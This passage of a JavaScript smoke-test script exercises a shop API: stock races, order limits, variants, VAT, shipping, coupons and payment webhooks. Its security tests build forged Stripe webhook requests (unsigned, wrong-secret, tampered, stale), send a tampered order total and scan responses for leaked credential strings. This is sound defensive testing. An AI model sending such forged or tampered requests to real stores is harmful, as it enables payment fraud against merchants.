        else fail('limits meta', JSON.stringify(meta)?.slice(0, 140));

        // Operator raises it from the admin → takes effect without a redeploy.
        if ((await setLimit({ order_max_qty_per_product: 10 })).status === 200) {
          const raised = await buy([{ product_id: lid, qty: 8 }]);
          if (raised.status === 201) ok('raising the limit in settings takes effect');
          else fail('raise limit', `status=${raised.status} (expected 201)`);
        } else fail('settings update', 'could not write order_max_qty_per_product');

        // A hostile/corrupt "0" must clamp to the floor, never mean "unlimited".
        await setLimit({ order_max_qty_per_product: 0 });
        const clampedOver = await buy([{ product_id: lid, qty: 2 }]);
        const clampedOk = await buy([{ product_id: lid, qty: 1 }]);
        if (clampedOver.status === 400 && clampedOk.status === 201) ok('a 0 limit clamps to 1 rather than disabling the cap');
        else fail('limit clamp', `qty2=${clampedOver.status} qty1=${clampedOk.status}`);

        // The second limit: distinct lines per order.
        await setLimit({ order_max_qty_per_product: 3, order_max_items_per_order: 2 });
        const tooManyLines = await buy([
          { product_id: lid, qty: 1 }, { product_id: productId, qty: 1 }, { product_id: lid, qty: 1 },
        ]);
        if (tooManyLines.status === 400) ok('max items per order is enforced');
        else fail('items limit', `status=${tooManyLines.status} (expected 400)`);
        await setLimit({ order_max_items_per_order: 50 }); // restore
      }
    }

    // --- THE regression: concurrent checkout must not oversell ---
    {
      const scarce = await (await mkProduct({ name: 'Scarce', slug: 'smoke-scarce', price_cents: 500, stock: 1 })).json().catch(() => null);
      const sid = scarce?.data?.id;
      if (sid) {
        const attempts = await Promise.all(
          Array.from({ length: 6 }, (_, i) =>
            fetch(`${BASE}/api/orders`, {
              method: 'POST', headers: ch,
              body: JSON.stringify({ email: `race${i}@example.com`, items: [{ product_id: sid, qty: 1 }] }),
            }).then((r) => r.status),
          ),
        );
        const created = attempts.filter((s) => s === 201).length;
        const left = (await (await fetch(`${BASE}/api/products/${sid}`)).json().catch(() => null))?.data?.stock;
        // Exactly one buyer may win the last unit; stock must never go negative.
        if (created === 1) ok('concurrent checkout does NOT oversell (exactly 1 of 6 wins)');
        else fail('OVERSELL', `${created} of 6 concurrent orders succeeded for stock=1`);
        if (left === 0) ok('stock lands exactly at 0 after the race');
        else fail('race stock', `stock=${left} (expected 0)`);
      }
    }

    // --- a product SAVE racing checkouts must not give reserved units back ---
    // The race above proves checkouts cannot oversell EACH OTHER. It says
    // nothing about the other writer to a product row: a save. On the
    // relational driver updateProduct was a read-then-write, and a reservation
    // landing between its read and its write was overwritten by the stale copy
    // — the unit went back on sale while it sat in somebody's order.
    // tests/stock-race.test.mjs forces that interleaving deterministically;
    // this is the same property through the real HTTP stack, on whichever
    // driver this smoke run is using. The assertion is arithmetic, so it holds
    // however the requests interleave and even if some checkouts are refused:
    // what is left is what was there minus what was SOLD.
    //
    // The saves are the ADMIN EDITOR's, not two-field patches. The editor
    // GETs the product when its dialog opens and PUTs every field back —
    // `stock` and the whole `variants` array included, at the counts it
    // loaded — so a `{ description }` patch, which never carried a count,
    // could not show the editor handing sold units back (it did, on every
    // driver). Each save here PUTs back the body GET returned BEFORE the
    // orders, with `stock_base` on each count, as src/pages/admin/products.astro
    // sends it.
    {
      const START = 6;
      const racy = await (await mkProduct({ name: 'Edited mid-sale', slug: 'smoke-save-race', price_cents: 700, stock: START })).json().catch(() => null);
      const rid = racy?.data?.id;
      const framed = await (await mkProduct({
        name: 'Edited mid-sale variants', slug: 'smoke-save-race-variants', price_cents: 900, stock: null,
        attributes: [{ name: 'Colour', values: ['Black', 'Tortoise'] }],
        variants: [
          { options: { Colour: 'Black' }, stock: START },
          { options: { Colour: 'Tortoise' }, stock: START },
        ],
      })).json().catch(() => null);
      const vid = framed?.data?.id;
      const blackV = (framed?.data?.variants || []).find((v) => v.options?.Colour === 'Black');
      if (rid && vid && blackV?.id) {
        const order = (email, item) => fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch, body: JSON.stringify({ email, items: [item] }),
        });
        const save = (id, body) => fetch(`${BASE}/api/products/${id}`, {
          method: 'PUT', headers: ch, body: JSON.stringify(body),
        });
        // The dialog opening: the staff GET, taken BEFORE any order.
        const opened = async (id) => (await (await fetch(`${BASE}/api/products/${id}`, { headers: ch })).json().catch(() => null))?.data;
        const openedSimple = await opened(rid);
        const openedVariants = await opened(vid);
        // What the editor's submit sends: everything it loaded, the edit, and
        // the loaded counts as `stock_base` (the route's allow-list drops the
        // read-only fields a GET carries).
        const editorBody = (loaded, edit) => ({
          ...loaded,
          ...edit,
          stock_base: loaded?.stock ?? null,
          variants: (loaded?.variants || []).map((v) => ({ ...v, stock_base: v.stock ?? null })),
        });
        const ops = [];
        if (openedSimple?.stock === START && (openedVariants?.variants || []).length === 2) {
          for (let i = 0; i < START; i += 1) {
            ops.push(order(`save-race${i}@example.com`, { product_id: rid, qty: 1 }).then((r) => ({ kind: 'simple', status: r.status })));
            ops.push(save(rid, editorBody(openedSimple, { description: `<p>edited during the sale, pass ${i}</p>` })).then((r) => ({ kind: 'save', status: r.status })));
            ops.push(order(`save-race-v${i}@example.com`, { product_id: vid, variant_id: blackV.id, qty: 1 }).then((r) => ({ kind: 'variant', status: r.status })));
            ops.push(save(vid, editorBody(openedVariants, { short_description: `edited during the sale, pass ${i}` })).then((r) => ({ kind: 'save', status: r.status })));
          }
        } else fail('save-race editor snapshot', `stock=${openedSimple?.stock} variants=${(openedVariants?.variants || []).length}`);
        const results = await Promise.all(ops);
        const sold = (kind) => results.filter((r) => r.kind === kind && r.status === 201).length;
        const saves = results.filter((r) => r.kind === 'save');
        const simpleAfter = (await (await fetch(`${BASE}/api/products/${rid}`)).json().catch(() => null))?.data;
        const variantsAfter = (await (await fetch(`${BASE}/api/products/${vid}`)).json().catch(() => null))?.data?.variants || [];
        const leftBlack = variantsAfter.find((v) => v.id === blackV.id)?.stock;
        const leftTort = variantsAfter.find((v) => v.options?.Colour === 'Tortoise')?.stock;

        if (saves.every((r) => r.status === 200)) ok('every product save made during the checkout race succeeded');
        else fail('saves during the race', saves.map((r) => r.status).join(','));
        if (simpleAfter?.stock === START - sold('simple')) {
          ok(`a save racing checkouts keeps every reservation (${sold('simple')} sold, ${simpleAfter?.stock} left of ${START})`);
        } else fail('SAVE GAVE STOCK BACK', `${sold('simple')} of ${START} sold, stock=${simpleAfter?.stock} (expected ${START - sold('simple')})`);
        if (leftBlack === START - sold('variant')) {
          ok(`...and so does a variant (${sold('variant')} sold, ${leftBlack} left of ${START})`);
        } else fail('SAVE GAVE VARIANT STOCK BACK', `${sold('variant')} sold, black=${leftBlack} (expected ${START - sold('variant')})`);
        if (leftTort === START) ok('...and the colour nobody bought is untouched by the race');
        else fail('variant isolation under a save race', `tortoise=${leftTort} (expected ${START})`);
        // The save derived `in_stock` from the copy it read; if the last unit
        // sold in between, a stale flag re-advertised it.
        if (simpleAfter?.in_stock === (simpleAfter?.stock > 0)) ok('in_stock agrees with the count after the race');
        else fail('in_stock after a save race', `stock=${simpleAfter?.stock} in_stock=${simpleAfter?.in_stock}`);
      } else fail('save-race fixtures', `simple=${!!rid} variable=${!!vid} black=${!!blackV?.id}`);
    }

    // --- cancellation returns stock (and is idempotent) ---
    if (productId) {
      const list = await (await fetch(`${BASE}/api/orders`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
      const target = (list?.data || []).find((o) => o.items?.some((i) => i.product_id === productId));
      if (target) {
        const before = (await (await fetch(`${BASE}/api/products/${productId}`)).json().catch(() => null))?.data?.stock;
        await fetch(`${BASE}/api/orders/${target.id}`, { method: 'PUT', headers: ch, body: JSON.stringify({ status: 'cancelled' }) });
        const after = (await (await fetch(`${BASE}/api/products/${productId}`)).json().catch(() => null))?.data?.stock;
        if (after === before + 2) ok('cancelling an order returns its stock');
        else fail('cancel restock', `${before} -> ${after} (expected +2)`);

        await fetch(`${BASE}/api/orders/${target.id}`, { method: 'PUT', headers: ch, body: JSON.stringify({ status: 'cancelled' }) });
        const again = (await (await fetch(`${BASE}/api/products/${productId}`)).json().catch(() => null))?.data?.stock;
        if (again === after) ok('re-cancelling does not credit stock twice');
        else fail('cancel idempotency', `${after} -> ${again}`);

        await fetch(`${BASE}/api/orders/${target.id}`, { method: 'PUT', headers: ch, body: JSON.stringify({ status: 'processing' }) });
        const reopened = (await (await fetch(`${BASE}/api/products/${productId}`)).json().catch(() => null))?.data?.stock;
        if (reopened === before) ok('reopening an order re-takes its stock');
        else fail('reopen restock', `${again} -> ${reopened} (expected ${before})`);
      }
    }

    // --- CONCURRENT status changes move an order's stock ONCE ---
    // The section above proves re-cancelling is idempotent one request after
    // another. Two at once was not: setOrderStatus read the status, moved the
    // stock, then wrote the status, so two cancels that both read `processing`
    // both handed the stock back (an admin double-click; an admin cancel
    // meeting the provider's refund webhook).
    //
    // WHAT THIS DOES NOT PROVE: that the race is gone. Run against the old
    // setOrderStatus it passed too — four concurrent PUTs through the full
    // HTTP stack did not overlap inside the read-move-write window in practice.
    // The proof is tests/order-status-race.test.mjs, which FORCES the
    // interleavings on all three drivers and failed 139 checks on the old code.
    // This is the HTTP-level guard: concurrent status requests answer 200 or
    // the state machine's 409 (never a 500), and the stock ends where exactly
    // one move would put it — assertions that hold for any interleaving.
    {
      // Stock for FOUR reopens at once: a reopen reserves before it claims the
      // status (see setOrderStatus), so every racer must be able to reserve
      // for all four to answer 200 — with less, a loser can be refused for
      // stock before the winner has claimed, which is the documented cost.
      const START = 10;
      const QTY = 2;
      const dbl = await (await mkProduct({ name: 'Double-cancelled', slug: 'smoke-status-race', price_cents: 400, stock: START })).json().catch(() => null);
      const did = dbl?.data?.id;
      const stockOf = async () => (await (await fetch(`${BASE}/api/products/${did}`)).json().catch(() => null))?.data?.stock;
      const placed = did
        ? await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ email: 'status-race@example.com', items: [{ product_id: did, qty: QTY }] }),
        })
        : null;
      // Checkout answers with the order NUMBER only — the buyer response carries
      // no internal id by design — so the id is looked up as staff, newest first.
      const placedNumber = placed ? (await placed.json().catch(() => null))?.data?.number : undefined;
      const orderId = placedNumber
        ? ((await (await fetch(`${BASE}/api/orders?limit=200`, { headers: ch })).json().catch(() => null))
          ?.data ?? []).find((o) => o.number === placedNumber)?.id
        : undefined;
      const held = did ? await stockOf() : undefined;
      if (placed?.status === 201 && orderId && held === START - QTY) {
        const put = (body) => fetch(`${BASE}/api/orders/${orderId}`, {
          method: 'PUT', headers: ch, body: JSON.stringify(body),
        }).then(async (r) => ({ status: r.status, body: await r.json().catch(() => null) }));

        const cancels = await Promise.all(Array.from({ length: 4 }, () => put({ status: 'cancelled' })));
        const afterCancel = await stockOf();
        if (cancels.every((r) => r.status === 200 && r.body?.data?.status === 'cancelled')) {
          ok('four concurrent cancels of one order all answer 200 with the cancelled order');
        } else fail('concurrent cancel answers', cancels.map((r) => r.status).join(','));
        if (afterCancel === START) ok('...and hand its stock back exactly once');
        else fail('DOUBLE RESTOCK', `stock=${afterCancel} after 4 concurrent cancels (expected ${START})`);

        const reopens = await Promise.all(Array.from({ length: 4 }, () => put({ status: 'processing' })));
        const afterReopen = await stockOf();
        if (reopens.every((r) => r.status === 200)) ok('four concurrent reopens all answer 200');
        else fail('concurrent reopen answers', reopens.map((r) => `${r.status}:${r.body?.error?.message ?? ''}`).join(','));
        if (afterReopen === START - QTY) ok('...and take the stock again exactly once');
        else fail('DOUBLE RETAKE', `stock=${afterReopen} after 4 concurrent reopens (expected ${START - QTY})`);

        // Two DIFFERENT releasing statuses at once: only one may happen, and
        // the other gets the state machine's refusal — a 409, never a 500.
        const mixed = await Promise.all([put({ status: 'cancelled' }), put({ status: 'refunded' })]);
        const afterMixed = await stockOf();
        const codes = mixed.map((r) => r.status).sort();
        if (codes[0] === 200 && codes[1] === 409) ok('a cancel racing a refund: one 200, one 409, no 500');
        else fail('cancel vs refund answers', mixed.map((r) => r.status).join(','));
        if (afterMixed === START) ok('...and the stock comes back exactly once');
        else fail('DOUBLE RESTOCK (cancel vs refund)', `stock=${afterMixed} (expected ${START})`);
      } else fail('status-race fixture', `product=${!!did} order=${placed?.status} number=${placedNumber} id=${!!orderId} held=${held} (expected ${START - QTY})`);
    }

    // --- variants: colour x size, with stock PER variant ---
    {
      const frame = await (await mkProduct({
        name: 'Smoke Aviator', slug: 'smoke-aviator', price_cents: 12000, stock: null,
        attributes: [{ name: 'Colour', values: ['Black', 'Tortoise'] }],
        variants: [
          { options: { Colour: 'Black' }, stock: 2 },
          { options: { Colour: 'Tortoise' }, stock: 5, price_cents: 13000 },
        ],
      })).json().catch(() => null);
      const fid = frame?.data?.id;
      const vs = frame?.data?.variants || [];
      const black = vs.find((v) => v.options?.Colour === 'Black');
      const tort = vs.find((v) => v.options?.Colour === 'Tortoise');

      if (vs.length === 2 && frame?.data?.type === 'variable') ok('a product with variants is stored as variable');
      else fail('variant create', JSON.stringify(frame?.data)?.slice(0, 180));
      if (black?.id && tort?.id && black.id !== tort.id) ok('each variant gets its own id');
      else fail('variant ids', JSON.stringify(vs)?.slice(0, 140));

      const buy = (variant_id, qty, email) => fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ email, items: [{ product_id: fid, variant_id, qty }] }),
      });

      // A variable product cannot be bought without choosing.
      const noChoice = await buy(undefined, 1, 'nc@example.com');
      if (noChoice.status === 400) ok('a variable product cannot be ordered without a variant');
      else fail('variant required', `status=${noChoice.status}`);
      const bogus = await buy('v-does-not-exist', 1, 'bg@example.com');
      if (bogus.status === 400) ok('an unknown variant is refused');
      else fail('unknown variant', `status=${bogus.status}`);

      // The variant's OWN price is charged.
      const boughtTort = await (await buy(tort.id, 1, 'tt@example.com')).json().catch(() => null);
      if (boughtTort?.data?.total_cents === 13000) ok("the variant's own price is charged, not the parent's");
      else fail('variant price', `total=${boughtTort?.data?.total_cents} (expected 13000)`);

      // THE property: stock is per variant, not a shared pool.
      const readVariants = async () => {
        const p = await (await fetch(`${BASE}/api/products/${fid}`)).json().catch(() => null);
        const list = p?.data?.variants || [];
        return {
          black: list.find((v) => v.id === black.id)?.stock,
          tort: list.find((v) => v.id === tort.id)?.stock,
        };
      };
      const afterTort = await readVariants();
      if (afterTort.tort === 4 && afterTort.black === 2) {
        ok('buying one variant does NOT draw down the other');
      } else fail('SHARED STOCK POOL', JSON.stringify(afterTort));

      // Black has 2. Six concurrent buyers, exactly two may win.
      const race = await Promise.all(Array.from({ length: 6 }, (_, i) =>
        buy(black.id, 1, `race${i}@example.com`).then((r) => r.status)));
      const won = race.filter((s) => s === 201).length;
      const afterRace = await readVariants();
      if (won === 2) ok('concurrent variant checkout does not oversell (exactly 2 of 6 win)');
      else fail('VARIANT OVERSELL', `${won} of 6 succeeded for a variant with stock=2`);
      if (afterRace.black === 0) ok('the variant lands exactly at 0 after the race');
      else fail('variant race stock', `black=${afterRace.black} (expected 0)`);
      if (afterRace.tort === 4) ok('the other variant is untouched by the race');
      else fail('variant isolation', `tort=${afterRace.tort} (expected 4)`);

      // Cancelling must credit the SAME variant.
      const orders = await (await fetch(`${BASE}/api/orders`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
      const blackOrder = (orders?.data || []).find((o) => o.items?.some((i) => i.variant_id === black.id));
      if (blackOrder) {
        await fetch(`${BASE}/api/orders/${blackOrder.id}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ status: 'cancelled' }),
        });
        const afterCancel = await readVariants();
        if (afterCancel.black === 1 && afterCancel.tort === 4) {
          ok('cancelling credits the variant it came from, not the parent');
        } else fail('variant restock', JSON.stringify(afterCancel));
        // The frozen options must survive on the order line.
        if (blackOrder.items[0]?.variant_options?.Colour === 'Black') {
          ok('the order line freezes the chosen options for invoicing');
        } else fail('frozen options', JSON.stringify(blackOrder.items?.[0]));
      }

      // A quote must price the variant too.
      const q = await (await fetch(`${BASE}/api/orders/quote`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ items: [{ product_id: fid, variant_id: tort.id, qty: 1 }] }),
      })).json().catch(() => null);
      if (q?.data?.total_cents === 13000) ok('quote prices the chosen variant');
      else fail('variant quote', `total=${q?.data?.total_cents}`);
    }

    // --- money maths: VAT, shipping, coupons, and quote/order agreement ---
    {
      // Configure a Greek-style install: 24% standard, 13% optical, prices
      // displayed VAT-inclusive.
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({
          tax_enabled: true,
          tax_prices_include_tax: true,
          tax_default_class: 'standard',
          tax_rates: [
            { class: 'standard', label: 'Standard', rate_bp: 2400 },
            { class: 'optical', label: 'Optical', rate_bp: 1300 },
          ],
        }),
      });

      // 24.80 incl. 24% VAT -> net 20.00, tax 4.80.
      const vatProd = await (await mkProduct({
        name: 'VAT Widget', slug: 'smoke-vat', price_cents: 2480, stock: 50,
        tax_class: 'standard', weight_grams: 500,
      })).json().catch(() => null);
      const vatId = vatProd?.data?.id;

      const quote = (body) => fetch(`${BASE}/api/orders/quote`, {
        method: 'POST', headers: ch, body: JSON.stringify(body),
      });

      const q1 = await (await quote({ items: [{ product_id: vatId, qty: 1 }] })).json().catch(() => null);
      if (q1?.data?.total_cents === 2480) ok('quote: inclusive pricing charges the shelf price');
      else fail('quote total', JSON.stringify(q1?.data)?.slice(0, 160));
      if (q1?.data?.tax_cents === 480) ok('quote: VAT is EXTRACTED from an inclusive price');
      else fail('quote vat', `tax=${q1?.data?.tax_cents} (expected 480)`);
      if (q1?.data?.lines?.[0]?.net_cents === 2000) ok('quote: the per-line net is reported for invoicing');
      else fail('quote line net', JSON.stringify(q1?.data?.lines)?.slice(0, 120));
      if (q1?.data?.prices_include_tax === true) ok('quote states which tax convention it used');
      else fail('quote convention', String(q1?.data?.prices_include_tax));

      // A quote must NOT reserve stock — a cart page calls it constantly.
      const stockBefore = (await (await fetch(`${BASE}/api/products/${vatId}`)).json().catch(() => null))?.data?.stock;
      await quote({ items: [{ product_id: vatId, qty: 3 }] });
      const stockAfter = (await (await fetch(`${BASE}/api/products/${vatId}`)).json().catch(() => null))?.data?.stock;
      if (stockBefore === stockAfter) ok('quote reserves NO stock (safe to call on every cart change)');
      else fail('QUOTE RESERVED STOCK', `${stockBefore} -> ${stockAfter}`);

      // --- shipping: mainland vs island, and the free-shipping threshold ---
      const mkMethod = (body) => fetch(`${BASE}/api/shipping-methods`, {
        method: 'POST', headers: ch, body: JSON.stringify(body),
      });
      const mainland = await (await mkMethod({
        name: 'Greece', zone: { countries: ['GR'] },
        rate: { kind: 'free_over', threshold_cents: 5000, otherwise_cents: 350 },
      })).json().catch(() => null);
      const islands = await (await mkMethod({
        name: 'Islands', zone: { countries: ['GR'], postcodes: ['84000-84999'] },
        rate: { kind: 'flat', amount_cents: 750 },
      })).json().catch(() => null);
      const mainlandId = mainland?.data?.id;
      const islandId = islands?.data?.id;
      if (mainlandId && islandId) ok('shipping methods can be created');
      else fail('shipping create', JSON.stringify(mainland)?.slice(0, 160));

      const qAthens = await (await quote({
        items: [{ product_id: vatId, qty: 1 }], shipping_country: 'GR', shipping_postcode: '10431',
      })).json().catch(() => null);
      const athensIds = (qAthens?.data?.available_shipping_methods || []).map((m) => m.id);
      if (athensIds.includes(mainlandId) && !athensIds.includes(islandId)) {
        ok('an Athens postcode is offered the mainland method only');
      } else fail('athens methods', JSON.stringify(athensIds));

      const qIsland = await (await quote({
        items: [{ product_id: vatId, qty: 1 }], shipping_country: 'GR', shipping_postcode: '84600',
      })).json().catch(() => null);
      const islandIds = (qIsland?.data?.available_shipping_methods || []).map((m) => m.id);
      // The important half: an island address must not be able to pick the
      // cheaper mainland rate.
      if (islandIds.includes(islandId) && !islandIds.includes(mainlandId)) {
        ok('an ISLAND postcode is offered the island method only (no cheap mainland rate)');
      } else fail('island methods', JSON.stringify(islandIds));

      // Free-shipping threshold: 1 unit is under 50.00, 3 units is over.
      const qUnder = await (await quote({
        items: [{ product_id: vatId, qty: 1 }], shipping_country: 'GR',
        shipping_postcode: '10431', shipping_method_id: mainlandId,
      })).json().catch(() => null);
      const qOver = await (await quote({
        items: [{ product_id: vatId, qty: 3 }], shipping_country: 'GR',
        shipping_postcode: '10431', shipping_method_id: mainlandId,
      })).json().catch(() => null);
      if (qUnder?.data?.shipping_cents === 350 && qOver?.data?.shipping_cents === 0) {
        ok('the free-shipping threshold applies above it and charges below');
      } else fail('free shipping', `under=${qUnder?.data?.shipping_cents} over=${qOver?.data?.shipping_cents}`);

      // --- coupons ---
      const mkCoupon = (body) => fetch(`${BASE}/api/coupons`, {
        method: 'POST', headers: ch, body: JSON.stringify(body),
      });
      await mkCoupon({ code: 'SMOKE10', kind: 'percent', value: 1000 });
      await mkCoupon({ code: 'SMOKEBIG', kind: 'fixed', value: 500, min_subtotal_cents: 100000 });
      await mkCoupon({ code: 'SMOKEOLD', kind: 'percent', value: 1000, ends_at: '2020-01-01T00:00:00Z' });

      const qCoupon = await (await quote({
        items: [{ product_id: vatId, qty: 1 }], coupon_code: 'smoke10',
      })).json().catch(() => null);
      if (qCoupon?.data?.discount_cents === 248) ok('a percentage coupon discounts the basket (case-insensitive)');
      else fail('coupon discount', `discount=${qCoupon?.data?.discount_cents} (expected 248)`);
      // The legal one: VAT must be charged on what is actually paid.
      if (qCoupon?.data?.total_cents === 2232 && qCoupon.data.tax_cents < 480) {
        ok('VAT is recomputed on the DISCOUNTED amount, not the list price');
      } else fail('discounted vat', JSON.stringify(qCoupon?.data)?.slice(0, 160));

      for (const [code, reason] of [['SMOKEBIG', 'minimum-not-met'], ['SMOKEOLD', 'expired'], ['NOSUCHCODE', 'not-found']]) {
        const r = await (await quote({ items: [{ product_id: vatId, qty: 1 }], coupon_code: code })).json().catch(() => null);
        if (r?.data?.coupon?.ok === false && r.data.coupon.reason === reason) {
          ok(`a rejected coupon reports "${reason}" so the UI can explain`);
        } else fail('coupon rejection', `${code} -> ${JSON.stringify(r?.data?.coupon)}`);
      }
      // A rejected code must not silently become an order at full price.
      const badCouponOrder = await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ email: 'c@example.com', items: [{ product_id: vatId, qty: 1 }], coupon_code: 'SMOKEOLD' }),
      });
      if (badCouponOrder.status === 400) ok('checkout REFUSES an expired coupon rather than charging full price');
      else fail('expired coupon at checkout', `status=${badCouponOrder.status}`);

      // --- THE property: quote and placeOrder must agree ---
      const basket = {
        items: [{ product_id: vatId, qty: 2 }],
        shipping_country: 'GR', shipping_postcode: '10431',
        shipping_method_id: mainlandId, coupon_code: 'SMOKE10',
      };
      const quoted = await (await quote(basket)).json().catch(() => null);
      const placed = await (await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch, body: JSON.stringify({ ...basket, email: 'agree@example.com' }),
      })).json().catch(() => null);
      if (placed?.data?.total_cents === quoted?.data?.total_cents) {
        ok(`quote and placeOrder agree on the total (${quoted?.data?.total_cents})`);
      } else fail('QUOTE/ORDER DRIFT', `quote=${quoted?.data?.total_cents} order=${placed?.data?.total_cents}`);

      // The order must persist its breakdown so an invoice is reproducible.
      const list = await (await fetch(`${BASE}/api/orders`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
      const stored = (list?.data || []).find((o) => o.number === placed?.data?.number);
      if (stored && stored.tax_cents > 0 && Array.isArray(stored.line_totals) && stored.line_totals.length === 1) {
        ok('the order stores its tax + per-line breakdown for invoicing');
      } else fail('order breakdown', JSON.stringify(stored)?.slice(0, 200));
      if (stored?.shipping_method_name === 'Greece') ok('the order records which shipping method was used');
      else fail('order shipping method', stored?.shipping_method_name);
      if (stored?.coupon_code === 'SMOKE10') ok('the order records the coupon applied');
      else fail('order coupon', stored?.coupon_code);

      // A client-supplied shipping cost must be ignored — only the id is honoured.
      const tampered = await (await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({
          email: 'tamper@example.com', items: [{ product_id: vatId, qty: 1 }],
          shipping_country: 'GR', shipping_postcode: '10431', shipping_method_id: mainlandId,
          shipping_cents: 1, total_cents: 1, tax_cents: 0,
        }),
      })).json().catch(() => null);
      if (tampered?.data?.total_cents === 2480 + 350) ok('client-supplied shipping/tax/total are ignored');
      else fail('TAMPERING ACCEPTED', `total=${tampered?.data?.total_cents}`);

      // --- order numbers must be unique under concurrency ---
      const concurrent = await Promise.all(Array.from({ length: 8 }, (_, i) =>
        fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ email: `n${i}@example.com`, items: [{ product_id: vatId, qty: 1 }] }),
        }).then((r) => r.json()).catch(() => null)));
      const numbers = concurrent.map((r) => r?.data?.number).filter(Boolean);
      if (numbers.length === 8 && new Set(numbers).size === 8) {
        ok('8 concurrent checkouts get 8 DISTINCT order numbers');
      } else fail('ORDER NUMBER COLLISION', `${new Set(numbers).size} distinct of ${numbers.length}`);

      // --- state machine ---
      if (stored?.id) {
        const put = (status) => fetch(`${BASE}/api/orders/${stored.id}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ status }),
        });
        await put('processing');
        await put('refunded');
        const back = await put('pending');
        if (back.status === 409) ok('refunded -> pending is refused by the state machine');
        else fail('state machine', `status=${back.status} (expected 409)`);
      }

      // Turn tax back off so later assertions see the totals they expect.
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: ch, body: JSON.stringify({ tax_enabled: false }),
      });
    }

    // --- payments: discovery, verification, and the full capture chain ---
    {
      const WHSEC = 'whsec_smoke_secret';
      // Sign exactly like Stripe: HMAC-SHA256 over `${timestamp}.${rawBody}`.
      const stripeSig = (body, secret = WHSEC, tsSec = Math.floor(Date.now() / 1000)) =>
        `t=${tsSec},v1=${crypto.createHmac('sha256', secret).update(`${tsSec}.${body}`).digest('hex')}`;
      const postHook = (provider, body, sig) =>
        fetch(`${BASE}/api/payments/webhook/${provider}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', ...(sig ? { 'stripe-signature': sig } : {}) },
          body,
        });

      // -- discovery --
      const methods = await (await fetch(`${BASE}/api/payments`)).json().catch(() => null);
      const ids = (methods?.data || []).map((m) => m.id);
      if (ids.includes('bank-transfer') && ids.includes('cod')) ok('manual payment methods are always offered');
      else fail('payment methods', JSON.stringify(ids).slice(0, 120));
      if (ids.includes('stripe')) ok('a fully configured provider is offered');
      else fail('provider enablement', JSON.stringify(ids).slice(0, 120));
      if (!ids.includes('paypal') && !ids.includes('klarna')) ok('providers without credentials are NOT offered');
      else fail('provider leak', `offered ${JSON.stringify(ids)} without credentials`);
      if (!/sk_test_smoke|whsec_smoke/.test(JSON.stringify(methods))) ok('the payments payload leaks no credential values');
      else fail('CREDENTIAL LEAK', JSON.stringify(methods).slice(0, 160));

      const anonMeta = methods?.meta;
      const staffMeta = (await (await fetch(`${BASE}/api/payments`, { headers: { Cookie: sessionCookie } })).json().catch(() => null))?.meta;
      if (!anonMeta?.providers) ok('provider diagnostics are hidden from anonymous callers');
      else fail('diagnostics leak', JSON.stringify(anonMeta).slice(0, 140));
      if (Array.isArray(staffMeta?.providers) && staffMeta.providers.some((p) => p.missing_env?.length)) {
        ok('staff see which credentials are still missing (names only)');
      } else fail('staff diagnostics', JSON.stringify(staffMeta).slice(0, 160));
      if (!/sk_test_smoke|whsec_smoke/.test(JSON.stringify(staffMeta))) ok('the staff diagnostics report names, never values');
      else fail('CREDENTIAL LEAK', JSON.stringify(staffMeta).slice(0, 160));

      // -- checkout only accepts methods this install can take --
      const badMethod = await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ email: 'x@example.com', payment_method: 'klarna', items: [{ product_id: productId, qty: 1 }] }),
      });
      if (badMethod.status === 400) ok('checkout refuses an unconfigured payment method');
      else fail('method gate', `status=${badMethod.status} (expected 400)`);

      // -- an order to drive through the payment chain --
      const payProduct = await (await mkProduct({ name: 'Payable', slug: 'smoke-payable', price_cents: 2500, stock: 10 })).json().catch(() => null);
      const payPid = payProduct?.data?.id;
      const placed = await (await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ email: 'payer@example.com', payment_method: 'stripe', items: [{ product_id: payPid, qty: 2 }] }),
      })).json().catch(() => null);
      const orderNumber = placed?.data?.number;
      const orderTotal = placed?.data?.total_cents; // 5000
      const findOrder = async () => {
        const list = await (await fetch(`${BASE}/api/orders`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
        return (list?.data || []).find((o) => o.number === orderNumber);
      };
      const orderRow = await findOrder();
      const orderId = orderRow?.id;
      if (orderTotal === 5000 && orderId) ok('an order can be placed against a configured provider');
      else fail('payable order', JSON.stringify(placed?.data)?.slice(0, 140));

      const evt = (over = {}) => JSON.stringify({
        id: `evt_smoke_${Math.random().toString(36).slice(2)}`,
        type: 'checkout.session.completed',
        data: { object: { id: 'cs_smoke', payment_status: 'paid', amount_total: 5000, currency: 'eur', metadata: { order_id: orderId }, ...over } },
      });

      // -- FORGERY: none of these may move the order --
      const unsigned = await postHook('stripe', evt());
      if (unsigned.status === 401) ok('an UNSIGNED webhook is rejected 401');
      else fail('webhook unsigned', `status=${unsigned.status} (expected 401)`);

      const wrongSecretBody = evt();
      const wrongSecret = await postHook('stripe', wrongSecretBody, stripeSig(wrongSecretBody, 'whsec_attacker'));
      if (wrongSecret.status === 401) ok('a webhook signed with the WRONG secret is rejected');
      else fail('webhook wrong secret', `status=${wrongSecret.status}`);

      const tamperBody = evt();
      const tampered = await postHook('stripe', tamperBody.replace('5000', '9999'), stripeSig(tamperBody));
      if (tampered.status === 401) ok('a webhook whose body was tampered after signing is rejected');
      else fail('webhook tampered', `status=${tampered.status}`);

      const staleBody = evt();
      const stale = await postHook('stripe', staleBody, stripeSig(staleBody, WHSEC, Math.floor(Date.now() / 1000) - 7200));
